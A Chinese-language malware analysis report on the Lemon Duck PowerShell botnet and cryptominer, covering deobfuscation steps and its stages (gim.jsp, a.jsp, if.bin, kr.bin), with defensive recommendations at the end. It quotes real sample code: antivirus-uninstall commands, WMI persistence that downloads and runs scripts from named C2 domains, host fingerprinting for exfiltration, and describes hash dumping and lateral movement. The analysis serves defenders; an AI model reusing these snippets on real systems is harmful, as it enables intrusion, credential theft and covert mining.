---
title: 基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告
description: 'powershell反混淆+无文件挖矿'
pubDate: 2025-04-01
lastModDate: ''
ogImage: true
toc: true
share: true
giscus: true
search: true
---

柠檬鸭（Lemon Duck）是**高度模块化**且**完全由脚本驱动**的僵尸网络框架。其核心技术特征建立在**高度混淆的 PowerShell 脚本链**之上。通过将不同的攻击功能（渗透、持久化、排他、挖矿载荷部署）拆解为独立的脚本模块，柠檬鸭实现了极高的灵活性与防御逃逸能力。

## 基本信息



| 文件名    | MD5 哈希值                       | 功能描述         |
| --------- | -------------------------------- | ---------------- |
| `gim.jsp` | b6f0e01c9e2676333490a750e58d4464 | 攻击的初始入口   |
| a.jsp     | c21caa84b327262f2cbcc12bbb510d15 | 攻击的核心调度器 |
| `if.bin`  | 888dc1ca4b18a3d424498244acf81f7d | 横向扩散核心     |
| `kr.bin`  | e04acec7ab98362d87d1c53d84fc4b03 | 挖矿核心         |

## 反混淆方法论

混淆并非柠檬鸭的附加功能，而是其**生存基石**。

脚本采用**字符串反转、无意义字符拼接干扰、字符集索引截取、关键字倒序、变量随机命名**等多种混淆手法。

以gim.jsp为案例使用手动反混淆方法

工具：Windows PowerShell 、记事本

方法："识别IEX，删除，运行"

识别IEX：如果你不知道这行具体做什么，就用PowerShel运行，就像下面一样。下图显示，实际上是Invoke-Expression cmdlet。*.( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')*

![6](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236808.png)

参考：[简单的解混之法](https://fareedfauzi.github.io/2021/02/06/LemonDuck-Powershell.html#final-result)

原文件：

```powershell
I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c49962........05f7cfc31fdfa1b27ff0f'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

第一层去混淆操作：删掉"I`EX"

修改后运行：

```powershell
echo$($(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c49962........05f7cfc31fdfa1b27ff0f'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); > .\decoded_1.txt
```

第二层先用[cyberchef](https://cyberchef.org/)整体反转

删除"&( $pShOMe[21]+$PSHOme[34]+'x')"、"( hCNVErbosepREFEReNcE.TOstRiNG()[1,3]+tfUxtf'+'U-JoIntfUtfU)"

修改后运行：

```powershell
$de=$((' ( ((tfUcm'+'d /c start........[CHaR]39  -ReplaCE  'hCN',[CHaR]36)| &( $pShOMe[21]+$PSHOme[34]+'x')

echo $de > .\decoded_2.txt
```

重复这个流程 直到只剩下可读明文代码

## 核心样本分析

### `gim.jsp`：攻击的初始入口

核心作用是「扫清障碍 + 拉取第二阶段脚本」：此阶段载荷主要负责在 Windows 环境下建立长效驻留。

- **防御突破**：卸载主流杀软（Eset、Kaspersky等），配置防火墙（转发 / 阻断规则），启用 SMB（为后续横向扩散铺路）；

```bash
#卸载主流杀软（Eset、Kaspersky等）
cmd /c start /b wmic.exe product where "name like '%Eset%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%%Kaspersky%%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avast%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avp%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Security%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%AntiVirus%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Norton Security%'" call uninstall /nointeractive
cmd /c "C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe" /verysilent /suppressmsgboxes /norestart

#配置防火墙（转发 / 阻断规则）
cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
netsh advfirewall firewall add rule name="deny445" dir=in protocol=tcp localport=445 action=block
netsh advfirewall firewall add rule name="deny135" dir=in protocol=tcp localport=135 action=block

#启用 SMB（为后续横向扩散铺路）
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 ???Force
```

- **权限检测**：验证当前用户是否为 administrator，是则创建计划任务blackball（持久化）；

```bash
$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if($sa)
	{schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"} 
	else 
	{schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"}
```

- **脚本拉取**：从 3 个备用域名（t.zz3r0.com等）下载 a.jsp 并改名 aa.jsp，下载后会触发「校验机制」（长度≥173→解密前 173 字符→SHA1 校验，校验通过才执行）。

```bash
#针对 3 个指定的恶意域名（t.zz3r0.com等）,通过 WMI 事件订阅创建每小时触发一次的隐蔽执行规则,下载 a.jsp 并改名 aa.jsp,实现持久化、无界面运行。
$us=@('t.zz3r0.com','t.zer9g.com','t.amynx.com')

foreach($u in $us){
$theName=getRan
$wmicmd=$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5)).replace('a.jsp','aa.jsp')
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="f"+$theName;
        EventNameSpace="root\cimv2";
        QueryLanguage="WQL";
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
        } -ErrorAction Stop);
        Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="c"+$theName;
        ExecutablePath="c:\windows\system32\cmd.exe";
        CommandLineTemplate="/c powershell -w hidden -c $wmicmd"})}
        start-sleep 5
    }
    
#对下载的a.jsp进行校验,下载后会触发「校验机制」（长度≥173→解密前 173 字符→SHA1 校验，校验通过才执行）
$tmps=function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient)."DownloadData"($u);
$c=$d.count;
if($c -gt 173){$b=$d[173..$c];
$p=New-Object Security.Cryptography.RSAParameters;
$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');
$p.Exponent=0x01,0x00,0x01;
$r=New-Object Security.Cryptography.RSACryptoServiceProvider;
$r.ImportParameters($p);
#校验
if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171]))))
#执行a.jsp
{I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*''))'}
```

### a.jsp：第二阶段攻击

负责「环境配置 + 模块下载 + 信息回传」，是整个攻击的核心调度器：
**基础配置**：强制修改 DNS 为 8.8.8.8/9.9.9.9（确保外网通信稳定）；

```bash
(get-wmiobject-classwin32_networkadapterconfiguration-filteripenabled=true).SetDNSServerSearchOrder(@(' 8.8.8.8 ',' 9.9.9.9 '))
```

**模块下载**：按条件拉取各功能 bin 文件（均为 powershell 脚本），下载时同样触发校验机制：
必下：if.bin（横向核心）、kr.bin（挖矿核心）、report.jsp（回传脚本）；
**条件下载**：ode.bin（无 kk4kk.log 时）、if_mail.bin（有 Outlook 且无 godmali4.txt 时）、m6g.bin/nvd.zip（64 位 + 显卡时）；

```bash
#定义恶意文件名称+MD5（用于校验，防止篡改）
$ifbin = "if.bin"; $ifmd5 = "888dc1ca4b18a3d424498244acf81f7d"
$krbin = "kr.bin"; $krmd5 = "e04acec7ab98362d87d1c53d84fc4b03"
if ($is64) {
    $mbin = "m6.bin"; $mmd5 = "dcd9144d509e7c6e1e63ecdd7e50e935"
    $mgbin = "m6g.bin"; $mgmd5 = "c8242bffbaf1f76085f140e5a7552692"
}
#下载并执行
SIEX "$core_url/report.jsp"
#下载NVIDIA挖矿驱动（针对64位+NVIDIA显卡主机）
if($isn -and $is64) {
	$nd = "nvd.zip"; $ndg = "$env:tmp\nvdg.dat"
	if(!(Test-Path $ndg) -or (Get-Item $ndg).Length -ne 22035968) {
            (New-Object Net.WebClient).DownloadFile($down_url+"/$nd", "$env:tmp\$nd")
            (New-Object -ComObject Shell.Application).Namespace($env:tmp).CopyHere("$env:tmp\$nd\*",16)
            Remove-Item $env:tmp\$nd
        }
    }
#执行邮件窃取+额外恶意模块
if($mflag) {
    try {
        $localMail = $false
        New-Object Threading.Mutex($true, 'Global\LocalMail', [ref]$localMail)
    } catch {}
    if($localMail -and !(Test-Path "$env:tmp\godmali4.txt")) {
        SIEX "$down_url/if_mail.bin"  # 邮件窃取模块
    }
}
if(!(Test-Path "$env:tmp\kk4kk.log")) {
    SIEX "$down_url/ode.bin"  # 额外恶意模块（远控/数据窃取）
}
```

**信息回传**：收集系统关键信息（系统版本 / 位数 / 用户 / 显卡 / 内存 / 权限等）、矿机总算力、3 个下载文件的 MD5，统一回传至t.amynx.com；

```bash
# 采集系统全量指纹
$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
$comp_name = $env:COMPUTERNAME
$guid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.ipenabled -EQ $true }).Macaddress | Select-Object -First 1
$osb = (Get-WmiObject -Class Win32_OperatingSystem)
$os = $osb.Caption.replace("Microsoft Windows", "") + "_" + $osb.Version
$user = $env:USERNAME
$domain = (Get-WmiObject win32_computersystem).Domain
$uptime = [timespan]::FromMilliseconds([environment]::TickCount).TotalSeconds
$card = (Get-WmiObject Win32_VideoController).name  # 采集显卡信息（判断是否适合挖矿）
$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1Gb  # 内存大小

# 采集可用磁盘信息（筛选可写入的磁盘）
try {
    $drive = ([system.IO.DriveInfo]::GetDrives() | where {
        $_.IsReady -and ($_.AvailableFreeSpace -gt 1024) -and 
        (($_.DriveType -eq "Removable") -or ($_.DriveType -eq "Network")) -and
        (($_.DriveFormat -eq "NTFS") -or ($_.DriveFormat -eq "FAT32"))
    } | foreach { ($_.Name)[0] + "_" + ($_.DriveType.ToString())[0] }) -join "|"
} catch {}
$timestamp = (Get-Date -UFormat "%s").Substring(0, 9)

#采集挖矿进程信息（本地43669端口，挖矿程序通信特征）
try {
    [Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
    $obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject((New-Object Net.WebClient).DownloadString('http://127.0.0.1:43669/1/summary'))
    $mv = $obj.version; $mip = $obj.connection.ip; $mhr = $obj.hashrate.total -join ','
} catch {}

#标记显卡类型（NVIDIA/AMD，优先挖矿）
if(($card -match "GTX|NVIDIA|GEFORCE")) { $isn = 1 }
if(($card -match "Radeon|AMD")) { $isa = 1 }
$v = $url.split("?")[1]
$params = @($v, $comp_name, $guid, $mac) -join "&"

# 执行重命名，采集恶意文件MD5（失败则静默忽略）
$rename = getrname
$lifmd5, $lmmd5, $lkrmd5 = "", "", ""
try { $lifmd5 = gmd5([IO.File]::ReadAllBytes("$env:tmp\$ifbin")) } catch {}
try { $lmmd5 = gmd5([IO.File]::ReadAllBytes("$env:tmp\$mbin")) } catch {}
try { $lkrmd5 = gmd5([IO.File]::ReadAllBytes("$env:tmp\$krbin")) } catch {}

# 定义C2下载域名（优先级：d.ackng.com → t.amynx.com）
$down_url = "http://d.ackng.com"
if (!$url) { $url = "http://t.amynx.com" }
$core_url = $url.split("/")[0..2] -join "/"
```

**标识特征**：下载时携带UALemon-Duck-标识，可作为检测特征。

```bash
$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace(' \ ',' - '))
```

### 功能模块层

由 a.jsp 下载的各类 bin 文件组成，是攻击的具体落地环节。

#### `if.bin`：内网渗透与传播模块

`if.bin`是一个功能完整、针对性强的内网渗透与横向传播模块，整合了漏洞利用、凭证窃取、多渠道传播等核心能力，主要面向 Windows 内网环境，技术复杂度较高。

##### 一、漏洞利用总览

if.bin 会先标识受害机漏洞，再从 http://t[.]amynx[.]com 下载对应漏洞利用脚本，全量漏洞清单如下：

| 漏洞类型                                                | 目的                                  | 特征                                                         |
| :------------------------------------------------------ | ------------------------------------- | :----------------------------------------------------------- |
| IPC$ 共享匿名访问漏洞 + Windows Defender 绕过（7p.php） | 横向移动入口 + 本地权限维持           | 匿名连接 IPC$、禁用 Defender、分发 USB 感染脚本              |
| SMBv1/SMBv2 权限提升漏洞（ipc.jsp/ipco.jsp）            | 权限提升（SMBGhost 变种）             | 利用 Trans2/NT_TRANS 命令堆溢出，注入恶意数据获取系统权限    |
| MSSQL 漏洞（ms.jsp/mso.jsp）                            | 数据库服务器横向移动 + 窃取数据库凭证 | 弱口令登录 1433 端口，启用 xp_cmdshell 执行木马              |
| 远程桌面漏洞（rdp.jsp/rdpo.jsp）                        | RDP 暴力破解 + BlueKeep 远程代码执行  | 暴力破解账号、绕过 NLA 限制，利用 msrdp.dll 堆溢出注入 shellcode |
| SMB 协议进阶漏洞（smgh.jsp/smgho.jsp）                  | SMB 权限提升（CVE-2021-36934 变种）   | 构造恶意 SMB1_TRANS2_EXPLOIT_PACKET，覆盖非分页池内存        |
| Redis 数据库漏洞（rds /rdso）                           | Redis 未授权访问 + 权限提升           | 6379 端口未授权，写入 crontab / 注册表植入木马               |
| SSH 协议漏洞（ssh /ssho）                               | SSH 弱口令暴力破解 + 权限提升         | 爆破 22 端口账号，适配 OpenSSH 9.0 + 密钥认证限制            |
| Hadoop YARN 漏洞（yarn /yarno）                         | YARN ResourceManager 未授权访问       | 8088 端口未授权，提交恶意 Application 执行命令               |

##### 二、漏洞解析

######  SMB 协议漏洞

SMB 是 `if.bin` 横向渗透的核心载体，整合了 SMBv1/SMBv2 协议多个高危漏洞（CVE-2020-0796、CVE-2021-36934 等），专门针对无补丁的 Windows 7/8/2008/2012 系统：

- 核心函数：`smb1_anonymous_connect_ipc`（匿名连接目标主机 IPC$ 共享）、`eb7/eb8`（构造恶意 SMB 数据包触发缓冲区溢出）；

![image-20260213184921229](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236809.png)

![image-20260214000205631](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236810.png)

- 攻击逻辑：
  1. 向目标主机 445 端口发送恶意 SMB 数据包；
  2. 利用堆溢出 / 内存破坏漏洞覆盖非分页池内存，注入 fake_recv_struct 伪造接收结构；
  3. 获取系统权限后注入 shellcode，执行禁用杀软、部署木马等命令；

###### RDP 漏洞

围绕RDP（3389 端口）协议的攻击与控制权获取，是横向移动的核心模块，包含 RDP 暴力破解、NLA 绕过、远程命令执行三大核心能力。

**`BRUTE`类**：RDP 暴力破解核心

- 支持 NLA 模式适配（`/sec:nla`参数），通过`/cert-ignore`绕过证书验证，实现 NLA 绕过；

![image-20260214000839851](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236811.png)

- 低频率探测策略（10 秒超时 + 1 秒循环检测），规避日志告警；

![image-20260214000902366](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236812.png)

- 解析 RDP 客户端输出（如`LogonInfoV2`标识登录成功、`Server rdp encryption method`标识服务存活），判断攻击结果。

![image-20260214000943093](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236813.png)

###### Redis 漏洞

利用未授权访问后的 “写文件 + 权限提升” ：

- 核心函数：`redisexec`（利用 Redis 漏洞实现 Linux 端渗透）、`Enable-SeDebugPrivilege`（启用高权限调试权限）、`LHSDGUKsdHF`（反射加载 PE 文件，提权工具）；

![image-20260214001057178](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236814.png)

##### 三、核心能力

###### 凭据窃取模块：窃取核心敏感信息

- Windows 账号哈希窃取：通过geth函数读取 SAM 注册表、计算 BootKey、RC4 解密 NTLM/LM 哈希，直接获取管理员账号凭据：

  ```bash
  # 核心流程：读取SAM注册表→计算BootKey→解密Hash→输出账号密码哈希
  function geth 
  function NewRC4([byte[]]$key)
  function Get-BootKey
  function Get-HBootKey
  function DumpHashes # 输出NTLM/LM哈希（可用于Pass-the-Hash横向移动）
  ```
  
- RDP 暴力破解：通过`RDP.BRUTE`类（C# 嵌入代码）暴力破解远程桌面账号，支持验证登录状态和加密方式；

- 其他信息窃取：收集主机名、UUID、MAC 地址、系统版本、内存大小等全量指纹，用于精准攻击。

###### 横向移动模块：扩散感染内网主机

- SMB 协议横向移动：通过`Invoke-SE`函数实现 SMB 远程命令执行，支持 NTLM 哈希认证（Pass-the-Hash），无需明文密码即可控制内网其他主机；
- RDP 横向移动：暴力破解成功后，通过`CMD.runCmd`函数远程执行命令，控制目标主机；
- 多协议适配：支持 SSH、Redis、MSSQL 等协议的远程命令执行，覆盖内网常见服务。

###### 传播扩散模块：USB 设备自动感染

通过`USB.USBLNK`类（C# 嵌入代码）实现USB 移动设备的自动化感染与木马传播，是扩大攻击范围的关键模块，通过创建恶意快捷方式（LNK）、JS 脚本，感染连接的 USB 设备，实现 “插上即感染”。

- 核心动作：
  1. 检测插入的 USB 设备（支持 FAT32/NTFS 格式）；
  2. 创建隐藏目录UTFsync，恶意 LNK 快捷方式（`blue3.bin.lnk/blue6.bin.lnk`）和 JS 脚本（`readme.js`）；
  3. LNK 文件指向 Base64 编码的恶意程序，JS 脚本调用WScript.Shell执行恶意命令；
  4. 记录已感染设备到黑名单，避免重复感染。

#### `kr.bin`：竞品清理与防御削弱

##### 一、竞品清理

清除目标主机上所有其他挖矿程序，避免算力被瓜分，从**进程、自启动项、网络连接**三个核心维度实现对竞品挖矿程序的彻底清理，覆盖挖矿程序的运行、持久化、网络通信全链路，让其他挖矿程序无法启动、无法持久化、无法连接挖矿代理。

###### 进程层面：强制终止 + 深度暂停，阻断竞品运行

脚本在`Killer`核心函数中，通过**预设挖矿进程特征库 + 精准进程暂停**，实现对其他挖矿程序进程的双重打击，不仅直接终止运行中的竞品，还能对漏网的挖矿进程做深度暂停，防止其重启。

**强制终止主流挖矿进程**：预设`$Miner`进程列表，包含近 60 个挖矿程序相关特征名，覆盖**门罗币挖矿（XMR\*、xmrig\*、minerd）**、挖矿代理（MinerGate）、其他币种挖矿（Carbon）等主流挖矿程序，同时包含挖矿程序常见的伪装进程名（svchosti、explores、conhoste 等，仿冒系统进程），通过`Stop-Process -Force`强制终止，无任何容错空间。

![image-20260213220121118](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236815.png)

**深度暂停挖矿代理关联进程**：对检测到的挖矿代理外网连接关联进程，通过`ProcessSuspend`函数调用`kernel32.dll`底层 API 实现**进程调试暂停**，该方式比原生终止更彻底，且需要`SeDebugPrivilege`高级权限才能解除，能有效防止其他挖矿程序的进程自重启，从进程运行层面实现算力独占。

![image-20260213220702841](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236816.png)

###### 持久化层面：删除竞品自启动项，杜绝挖矿程序重启

挖矿程序通常会通过**系统服务、计划任务**实现持久化，脚本针对性清理竞品挖矿程序的自启动配置，让其即使被手动启动，也无法在主机重启后自动运行，从根源上消除竞品复现的可能。

**禁用并删除挖矿相关服务**：预设`$SrvName`恶意服务列表，包含柠檬鸭识别的其他挖矿程序创建的伪装服务（如 xWinWpdSrv、SVSHost、WinHelp32/64）、挖矿程序的持久化服务（如 sysmgt、WebServers），通过`sc.exe`执行**禁用→停止→删除**三步操作，彻底清除挖矿服务自启动项。

![image-20260213221001585](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236817.png)

**强制删除挖矿相关计划任务**：预设`$TaskName`计划任务列表，包含其他挖矿程序的定时启动任务（如 my1、Mysa 系列、gm/ngm）、挖矿程序伪装的系统任务（如 Windows_Update、Update_windows），通过`SchTasks.exe /Delete /F`强制删除，无提示且不可恢复，切断挖矿程序的定时持久化路径。

![image-20260213221114296](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236818.png)

###### 网络层面：阻断竞品挖矿代理连接

挖矿程序的核心需求是连接挖矿代理 / 矿池获取挖矿任务，脚本从**IP 封禁 + 代理检测**两个维度，阻断其他挖矿程序与外网挖矿代理的通信，让竞品即使进程未被清理，也无法获取挖矿任务，失去挖矿价值。

**精准检测挖矿代理连接**：通过`isminerproxy`/`isminerproxys`函数，针对 XMRig 等主流挖矿程序的**JSONRPC 协议特征**，检测目标主机与外网的挖矿代理连接，覆盖**明文 + TLS 加密**两种挖矿代理通信方式，无死角识别竞品的挖矿网络连接。

![image-20260213221406300](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236819.png)

**永久封禁挖矿代理 IP**：对检测到的挖矿代理 IP，通过`banIp`函数执行`route add $ip 0.0.0.0 IF 1 -p`添加**永久静态路由**，将挖矿代理 IP 指向空地址，实现本地网络层面的永久阻断，且该路由规则默认对所有网络连接生效，其他挖矿程序无法绕开。

![image-20260213221453774](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236820.png)

**缓存已处置 IP，避免重复操作**：通过全局变量`$ipdealcache`缓存已封禁的挖矿代理 IP: 端口，后续循环检测中直接执行进程暂停 + IP 封禁，提升清理效率，确保挖矿代理连接被持续阻断。

![image-20260213221601019](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236821.png)

##### 二、防御削弱

通过**禁用系统防护工具、删除监控组件、破坏系统更新、干扰人工操作**等方式，削弱目标主机的防御与监控能力。

###### 禁用系统原生防护与监控工具

脚本针对性打击 Windows 系统原生的防护、监控组件，让系统失去基础的恶意行为检测能力，无法识别柠檬鸭的挖矿行为。

1. **终止系统杀毒 / 防护进程**：在`$Miner`进程列表中包含`WindowsDefender*`，直接强制终止 Windows Defender 杀毒软件进程，禁用系统原生的恶意程序检测功能，让柠檬鸭的挖矿进程、恶意文件无法被查杀。
2. **删除系统监控相关任务 / 服务**：在`$SrvName`/`$TaskName`中包含`Microsoft Telemetry`（微软遥测服务，负责系统行为监控与上报）、`System Log Security Check`（系统日志安全检测任务），通过禁用服务、删除任务的方式，切断系统的行为监控与日志上报，柠檬鸭的挖矿操作不会被系统日志记录，管理员无法通过系统日志发现异常。

###### 打击云服务 / 第三方监控工具

针对企业主机常用的**云服务监控、第三方安全工具**，脚本通过清理其相关服务、进程，让远程监控端无法获取目标主机的状态，实现 “离线式” 挖矿。

1. **清理云监控相关服务**：`$SrvName`中的`WebServers`、`ExpressVNService`为云服务监控常用的 web 服务、代理服务，删除此类服务会导致云监控端无法通过网络连接目标主机，无法获取主机的进程、网络、资源占用等监控数据，柠檬鸭的挖矿算力占用无法被远程发现。
2. **打击第三方安全软件**：`$SrvName`中的`360rTys`指向 360 等第三方安全软件的相关服务，通过禁用删除让第三方安全软件失效，无法对柠檬鸭的挖矿行为做实时检测与拦截。

###### 破坏系统更新与安全策略，削弱主机防御能力

脚本通过禁用系统更新、破坏系统安全策略，让目标主机无法修复系统漏洞、无法配置安全规则，不仅让柠檬鸭能通过漏洞持续持久化，也让管理员无法通过系统层面的配置防御挖矿行为。

1. **禁用系统更新相关组件**：在`$SrvName`/`$TaskName`中多次出现`Windows_Update`、`Update_windows`、`WindowsUpdate1-3`等系统更新相关名称，即使是系统原生的更新服务 / 任务，也会被脚本禁用删除，目标主机无法下载并安装系统漏洞补丁，柠檬鸭可利用已知系统漏洞持续控制主机，且管理员无法通过更新系统封堵挖矿木马的入侵路径。
2. **破坏系统安全策略相关服务**：`$SrvName`中的`IPSECS`（IP 安全策略服务）是 Windows 系统实现 IP 访问控制、安全加密的核心服务，禁用该服务后，管理员无法通过配置 IP 安全策略封禁挖矿代理 IP，也无法限制进程的网络通信，从系统安全策略层面瓦解防御。

###### 干扰人工管理操作，降低被手动清理的概率

脚本通过**后台启动任务管理器、清理系统管理工具相关进程**的方式，干扰管理员的人工主机管理操作，让管理员无法快速发现并手动终止柠檬鸭的挖矿进程。

**后台启动任务管理器，干扰进程查看**：脚本在`Killer`函数中检测任务管理器（TaskMgr）是否运行，若未运行则通过`Start-Process -WindowStyle hidden`**后台启动**，管理员手动打开任务管理器时会出现界面异常，无法正常查看主机的进程列表，也就无法发现柠檬鸭的挖矿进程。

![image-20260213222306764](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162236822.png)

**清理系统管理工具相关进程**：`$Miner`进程列表中包含`taskmgr1`（伪装 / 异常的任务管理器进程）、`msinfo`（系统信息工具进程），强制终止此类进程，让管理员无法通过系统原生工具查看主机的进程、资源、网络等关键信息，无法手动定位并清理柠檬鸭的挖矿组件。

## 处置建议

1. **补丁管理**：重点修复 MS17-010 及 CVE-2020-0796。

2. **端口封禁**：严格限制内网 135、139、445 及 3389 端口的跨网段通信。

3. **弱口令清理**：强制修改 SSH、Redis 及 SQL Server 的默认/弱口令。

4. **监测**：监控 PowerShell 异常执行记录（尤其是带有 Base64 编码的指令流）及 WMI 事件订阅的变化。

   

**参考资料**

[典型挖矿家族系列分析四丨LemonDuck挖矿僵尸网络 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/360231.html)

[柠檬鸭（Lemon Duck）样本分析 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/forum.php?mod=viewthread&tid=1346660&highlight=%C4%FB%C3%CA%D1%BC)

[永恒之蓝木马下载器再更新，云上主机成为新目标 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/253431.html)

[蠕虫病毒“柠檬鸭”持续扩散 多种暴破方式攻击用户电脑 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1157955-1-1.html)

[挖矿病毒分析之powershell解密小技巧 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1543561-1-1.html)

